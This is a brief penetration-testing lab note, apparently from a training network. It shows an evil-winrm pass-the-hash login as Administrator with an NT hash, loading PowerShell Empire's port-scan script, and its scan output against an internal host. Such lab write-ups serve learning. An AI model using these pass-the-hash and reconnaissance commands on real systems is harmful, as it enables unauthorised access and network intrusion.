Using Evil-winrm we can pass the scripts folder  and call a particular script afterwards

`evil-winrm -u Administrator  -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.89.150 -s /usr/share/powershell-empire/data/module_source/situational_awareness/network/`

loading the script
`Invoke-Portscan.ps1`

using the script
`Invoke-Portscan -Hosts 10.200.89.100 -TopPorts 50`

output:
`Hostname      : 10.200.89.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 79, 88...}
finishTime    : 4/30/2021 4:07:54 PM
`
![[Screenshot 2021-04-30 at 8.46.55 PM.png]]

